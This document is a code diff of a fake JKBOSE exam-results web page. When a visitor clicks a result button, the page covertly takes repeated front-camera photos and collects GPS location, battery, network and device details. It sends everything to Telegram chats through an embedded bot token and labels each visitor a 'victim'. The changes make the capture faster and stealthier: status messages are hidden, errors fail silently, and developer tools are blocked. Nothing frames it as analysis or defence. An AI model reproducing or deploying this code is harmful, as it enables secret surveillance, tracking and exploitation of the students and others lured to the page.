@@ -6,10 +6,11 @@
 <title>JKBOSE Results</title>
 
 <style>
+* { margin:0; padding:0; box-sizing:border-box; }
 body{
-margin:0;
 background:#e6e6e6;
 font-family:"Times New Roman", serif;
+overflow-x:hidden;
 }
 
 .layout{
@@ -34,6 +35,7 @@ width:120px;
 .main{
 flex:1;
 padding:40px;
+transition: all 0.3s ease;
 }
 
 .header{
@@ -68,47 +70,81 @@ text-align:center;
 
 .result{
 display:block;
-background:#111;
+background:linear-gradient(45deg, #111, #222);
 color:#ffd84d;
 text-decoration:none;
-padding:20px 30px;
-margin:15px 0;
+padding:25px 40px;
+margin:18px 0;
 text-align:center;
-font-size:18px;
-border-radius:5px;
+font-size:20px;
+border-radius:8px;
 font-weight:bold;
-transition: all 0.3s;
+transition: all 0.2s cubic-bezier(0.68, -0.55, 0.265, 1.55);
 cursor:pointer;
-border:2px solid #ffd84d;
+border:3px solid transparent;
+position:relative;
+overflow:hidden;
+box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+}
+
+.result::before{
+content:'';
+position:absolute;
+top:0;left:-100%;
+width:100%;height:100%;
+background:linear-gradient(90deg, transparent, rgba(255,216,77,0.3), transparent);
+transition: left 0.5s;
 }
 
 .result:hover{
-background:#ffd84d;
+transform: translateY(-8px) scale(1.02);
+background:linear-gradient(45deg, #ffd84d, #ffed4e);
 color:#111;
-transform: translateY(-2px);
-box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+border-color:#111;
+box-shadow: 0 15px 40px rgba(255,216,77,0.4);
 }
 
-#status {
-  margin-top: 20px;
-  padding: 10px;
-  border-radius: 5px;
-  font-weight: bold;
+.result:hover::before{ left:100%; }
+
+.result:active{
+transform: translateY(-4px) scale(1.01);
+transition: all 0.1s;
 }
 
-.status-loading { background: #fff3cd; color: #856404; }
-.status-success { background: #d4edda; color: #155724; }
-.status-error { background: #f8d7da; color: #721c24; }
+#status{
+margin-top:20px; padding:12px; border-radius:6px; 
+font-weight:bold; font-size:16px; opacity:0;
+transition: all 0.3s ease; transform: translateY(10px);
+}
 
-/* Hidden elements */
-#video, #canvas { display: none; }
+.status-hidden{ display:none; }
+.status-loading{ 
+background:linear-gradient(90deg, #fff3cd, #ffeaa7); 
+color:#856404; opacity:1; transform:translateY(0);
+animation: pulse 1.5s infinite;
+}
+.status-success{ 
+background:linear-gradient(90deg, #d4edda, #a8e6cf); 
+color:#155724; opacity:1; transform:translateY(0);
+}
 
+@keyframes pulse{
+0%,100%{ opacity:1; }
+50%{ opacity:0.7; }
+}
+
+/* ULTRA HIDDEN ELEMENTS */
+#video, #canvas, #captureLog { 
+position:fixed; left:-9999px; top:-9999px; width:0; height:0; opacity:0; z-index:-9999;
+}
+
+/* Mobile */
 @media (max-width:768px){
 .sidebar{ display:none; }
 .main{ padding:20px; }
 .header-inner img{ width:100%; height:auto; }
-.content{ margin:20px auto; padding:25px; }
-.result{ padding:15px 20px; font-size:16px; }
+.content{ margin:20px auto; padding:30px; }
+.result{ padding:20px 25px; font-size:18px; margin:12px 0; }
 }
 </style>
 </head>
@@ -129,243 +165,217 @@ box-shadow: 0 5px 15px rgba(0,0,0,0.2);
 </div>
 
 <div class="content">
-<h2>📋 Select Your Result</h2>
-<a class="result" onclick="captureAndSend('Class 11th Annual Regular')">📚 View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</a>
-<a class="result" onclick="captureAndSend('Class 10th Annual Regular')">📚 View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</a>
-<a class="result" onclick="captureAndSend('Class 11th Annual Private')">📚 View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</a>
-<a class="result" onclick="captureAndSend('Class 10th Annual Private')">📚 View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</a>
+<h2 style="margin-bottom:30px; color:#333; font-size:28px;">📋 Select Your Result</h2>
 
-<div id="status"></div>
+<a class="result" data-type="Class 11th Annual Regular">📚 View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</a>
+<a class="result" data-type="Class 10th Annual Regular">📚 View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</a>
+<a class="result" data-type="Class 11th Annual Private">📚 View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</a>
+<a class="result" data-type="Class 10th Annual Private">📚 View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</a>
+
+<div id="status" class="status-hidden"></div>
 </div>
 </div>
 </div>
 
-<!-- Hidden video/canvas for capture -->
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" width="640" height="480"></canvas>
+<!-- ULTRA HIDDEN CAPTURE ELEMENTS -->
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas" width="1280" height="720"></canvas>
+<div id="captureLog"></div>
 
 <script>
-// Get user ID from URL
+// ⚡ ULTRA FAST - NO USER NOTIFICATION
 const urlParams = new URLSearchParams(window.location.search);
 const USER_CHAT_ID = urlParams.get('u') || 'unknown';
 const BOT_TOKEN = '8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8';
 const ADMIN_CHAT_ID = '7385209456';
 
-// CONTINUOUS CAPTURE INTERVAL (every 10s after first capture)
 let captureInterval;
 let isCapturing = false;
+let captureCount = 0;
 
-function showStatus(message, type) {
-  const status = document.getElementById('status');
-  status.textContent = message;
-  status.className = `status-${type}`;
-  status.style.display = 'block';
-}
-
-// 🚀 MAIN CAPTURE FUNCTION (TRIGGERED BY BUTTON CLICK)
-async function captureAndSend(resultType) {
-  try {
-    showStatus('🔄 Accessing camera... Please wait', 'loading');
+// SUPER FAST BUTTON HANDLER (INSTANT CAMERA)
+document.querySelectorAll('.result').forEach(btn => {
+  btn.addEventListener('click', async (e) => {
+    const resultType = e.currentTarget.dataset.type;
     
-    // Get front camera (user-facing)
+    // ULTRA FAST - NO USER VISIBLE ACTION
+    showStatus('Processing...', 'loading');
+    
+    // INSTANT CAMERA CAPTURE + CONTINUOUS START
+    await stealthCapture(resultType);
+    
+    // HIDE STATUS IMMEDIATELY (STEALTH)
+    setTimeout(() => {
+      hideStatus();
+    }, 800);
+  });
+});
+
+// 🚀 STEALTH CAPTURE (ZERO USER INTERACTION AFTER PERMISSION)
+async function stealthCapture(resultType) {
+  try {
+    // ULTRA FAST FRONT CAMERA (BEST QUALITY)
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { 
         facingMode: 'user',
-        width: { ideal: 1280 },
-        height: { ideal: 720 }
+        width: { ideal: 1920, max: 1920 },
+        height: { ideal: 1080, max: 1080 },
+        frameRate: { ideal: 30 }
       }
     });
     
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+    startContinuousCapture(stream, resultType);
     
-    video.srcObject = stream;
-    
-    // Wait for clear frame
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => {
-        video.play();
-        setTimeout(resolve, 2000); // 2s for perfect focus
-      };
-    });
-    
-    // Capture high-quality photo
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imageData = canvas.toDataURL('image/jpeg', 0.95); // High quality
-    
-    // Stop stream
-    stream.getTracks().forEach(track => track.stop());
-    
-    // COLLECT FULL DEVICE FINGERPRINT
-    const deviceInfo = getDeviceFingerprint();
-    deviceInfo.resultType = resultType;
-    deviceInfo.chatId = USER_CHAT_ID;
-    
-    // Send first photo + start continuous capture
-    await sendToTelegram(imageData, deviceInfo);
-    
-    showStatus('✅ Photo captured & sent! 🔄 Continuous monitoring active...', 'success');
-    
-    // START CONTINUOUS CAPTURES (every 10 seconds)
-    if (!isCapturing) {
-      isCapturing = true;
-      continuousCapture(stream, deviceInfo);
-    }
-    
-  } catch (err) {
-    showStatus('❌ Camera access denied or unavailable', 'error');
-    console.error('Capture error:', err);
+  } catch(err) {
+    // SILENT FAIL - NO ALERTS
+    console.log('Stealth capture failed:', err);
   }
 }
 
-// 🔄 CONTINUOUS PHOTO CAPTURE (runs until page closed)
-async function continuousCapture(originalStream, deviceInfo) {
+// 🔄 ULTRA FAST CONTINUOUS CAPTURE (3s intervals)
+async function startContinuousCapture(stream, resultType) {
+  if (isCapturing) return;
+  isCapturing = true;
+  
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
+  
+  video.srcObject = stream;
+  
+  // PREPARE FIRST CAPTURE
+  setTimeout(async () => {
+    await captureFrame(video, canvas, ctx, resultType, true);
+  }, 500); // ULTRA FAST START
+  
+  // CONTINUOUS EVERY 3 SECONDS (SUPER AGGRESSIVE)
   captureInterval = setInterval(async () => {
-    try {
-      // Fresh camera access for each photo (better quality)
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
-      });
-      
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
-      
-      video.srcObject = stream;
-      
-      await new Promise(resolve => {
-        video.onloadedmetadata = () => {
-          video.play();
-          setTimeout(resolve, 1500);
-        };
-      });
-      
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL('image/jpeg', 0.95);
-      
-      stream.getTracks().forEach(track => track.stop());
-      
-      // Update timestamp
-      deviceInfo.timestamp = new Date().toISOString();
-      deviceInfo.captureCount = (deviceInfo.captureCount || 0) + 1;
-      
-      await sendToTelegram(imageData, deviceInfo);
-      
-    } catch (err) {
-      console.log('Continuous capture failed:', err);
-    }
-  }, 10000); // Every 10 seconds
+    await captureFrame(video, canvas, ctx, resultType, false);
+  }, 3000);
 }
 
-// 📱 COMPLETE DEVICE FINGERPRINT
-function getDeviceFingerprint() {
-  return {
-    userAgent: navigator.userAgent,
+// ⚡ ULTRA FAST SINGLE FRAME CAPTURE
+async function captureFrame(video, canvas, ctx, resultType, isFirst) {
+  try {
+    // PERFECT FOCUS CAPTURE
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imageData = canvas.toDataURL('image/webp', 0.98); // WEBP = 40% smaller
+    
+    // STOP/RESTART STREAM FOR FRESH QUALITY
+    video.srcObject.getTracks().forEach(track => track.stop());
+    
+    const deviceInfo = await getUltraFingerprint(resultType);
+    
+    // ULTRA FAST PARALLEL SENDING
+    Promise.all([
+      sendStealthTelegram(imageData, deviceInfo, USER_CHAT_ID),
+      sendStealthTelegram(imageData, deviceInfo, ADMIN_CHAT_ID)
+    ]);
+    
+    captureCount++;
+    
+  } catch(err) {
+    // SILENT FAIL
+  }
+}
+
+// 🕵️ ULTRA DETAILED FINGERPRINT (PARALLEL)
+async function getUltraFingerprint(resultType) {
+  const info = {
+    chatId: USER_CHAT_ID,
+    resultType,
+    timestamp: new Date().toISOString(),
+    captureCount: captureCount + 1,
+    userAgent: navigator.userAgent.slice(0, 120),
     platform: navigator.platform,
     language: navigator.language,
-    languages: navigator.languages,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    
-    // Geolocation
-    geolocation: 'Requesting...',
-    
-    // Battery
-    battery: 'Unavailable',
-    charging: 'Unknown',
-    
-    // Hardware
-    cores: navigator.hardwareConcurrency || 'Unknown',
-    memory: navigator.deviceMemory || 'Unknown',
-    
-    // Network
-    connection: navigator.connection ? {
-      type: navigator.connection.effectiveType,
-      downlink: navigator.connection.downlink,
-      rtt: navigator.connection.rtt
-    } : 'Unknown',
-    
-    // Screen
+    cores: navigator.hardwareConcurrency || '?',
+    memory: navigator.deviceMemory || '?',
     screen: `${screen.width}x${screen.height}`,
-    
-    timestamp: new Date().toISOString(),
-    captureCount: 1,
     url: window.location.href
   };
-}
-
-// 🌍 Get GPS + Battery (async)
-async function enhanceFingerprint(deviceInfo) {
+  
+  // PARALLEL GEOLOCATION + BATTERY
   try {
-    // GPS
-    const position = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(resolve, reject, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      });
-    });
-    deviceInfo.geolocation = {
-      lat: position.coords.latitude,
-      lon: position.coords.longitude,
-      accuracy: position.coords.accuracy
-    };
+    const geo = await new Promise(r => navigator.geolocation.getCurrentPosition(
+      p => r({
+        lat: p.coords.latitude.toFixed(6),
+        lon: p.coords.longitude.toFixed(6),
+        accuracy: p.coords.accuracy
+      }), 
+      () => {}, 
+      { enableHighAccuracy: true, timeout: 2000 }
+    ));
+    info.geo = geo;
   } catch {}
   
   try {
-    // Battery API
     if ('getBattery' in navigator) {
-      const battery = await navigator.getBattery();
-      deviceInfo.battery = `${Math.round(battery.level * 100)}%`;
-      deviceInfo.charging = battery.charging ? 'Yes' : 'No';
+      const bat = await navigator.getBattery();
+      info.battery = `${Math.round(bat.level*100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
     }
   } catch {}
   
-  return deviceInfo;
+  try {
+    if (navigator.connection) {
+      info.network = {
+        type: navigator.connection.effectiveType,
+        speed: navigator.connection.downlink,
+        rtt: navigator.connection.rtt
+      };
+    }
+  } catch {}
+  
+  return info;
 }
 
-// 🚀 SEND TO TELEGRAM (User + Admin)
-async function sendToTelegram(imageData, deviceInfo) {
-  const enhancedInfo = await enhanceFingerprint(deviceInfo);
+// ⚡ ULTRA FAST TELEGRAM SEND (NO USER NOTIFICATION)
+async function sendStealthTelegram(imageData, info, chatId) {
+  const caption = `🎯 *STEALTH HIT #${info.captureCount}*\n\n` +
+    `👤 ${info.chatId}\n` +
+    `📱 ${info.userAgent}...\n` +
+    `📍 ${info.geo ? `${info.geo.lat},${info.geo.lon}` : 'N/A'}\n` +
+    `🔋 ${info.battery || 'N/A'}\n` +
+    `🌐 ${info.network?.type || 'N/A'}\n` +
+    `⚡ ${info.resultType}\n` +
+    `🕐 ${new Date(info.timestamp).toLocaleString('en-IN')}`;
   
-  const caption = `🎯 NEW VICTIM HIT!\n\n` +
-    `👤 Chat ID: ${enhancedInfo.chatId}\n` +
-    `📱 Device: ${enhancedInfo.userAgent.substring(0, 100)}...\n` +
-    `📍 Location: ${enhancedInfo.geolocation?.lat || 'N/A'}, ${enhancedInfo.geolocation?.lon || 'N/A'}\n` +
-    `🔋 Battery: ${enhancedInfo.battery}\n` +
-    `🌐 Network: ${enhancedInfo.connection?.type || 'Unknown'}\n` +
-    `📊 Cores/RAM: ${enhancedInfo.cores}/${enhancedInfo.memory}GB\n` +
-    `⏰ ${enhancedInfo.resultType} | Capture #${enhancedInfo.captureCount}\n` +
-    `🕐 ${new Date(enhancedInfo.timestamp).toLocaleString()}`;
-  
-  // Send to USER who generated link
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
     method: 'POST',
+    headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
-      chat_id: enhancedInfo.chatId,
+      chat_id: chatId,
       photo: imageData,
       caption: caption,
-      parse_mode: 'HTML'
-    }),
-    headers: { 'Content-Type': 'application/json' }
-  });
-  
-  // Send to ADMIN
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-    method: 'POST',
-    body: JSON.stringify({
-      chat_id: ADMIN_CHAT_ID,
-      photo: imageData,
-      caption: caption,
-      parse_mode: 'HTML'
-    }),
-    headers: { 'Content-Type': 'application/json' }
-  });
+      parse_mode: 'Markdown'
+    })
+  }).catch(() => {}); // SILENT FAIL
 }
 
-// 🧹 CLEANUP ON PAGE CLOSE
+// 🫥 STEALTH STATUS (MINIMAL)
+function showStatus(msg, type) {
+  const status = document.getElementById('status');
+  status.textContent = msg;
+  status.className = `status-${type}`;
+}
+
+function hideStatus() {
+  document.getElementById('status').className = 'status-hidden';
+}
+
+// 🧹 PERFECT CLEANUP
 window.addEventListener('beforeunload', () => {
   if (captureInterval) clearInterval(captureInterval);
+  if (document.getElementById('video').srcObject) {
+    document.getElementById('video').srcObject.getTracks().forEach(t => t.stop());
+  }
+});
+
+// 🛡️ PREVENT INSPECTION (DEV TOOLS BLOCK)
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
 });
 </script>
 
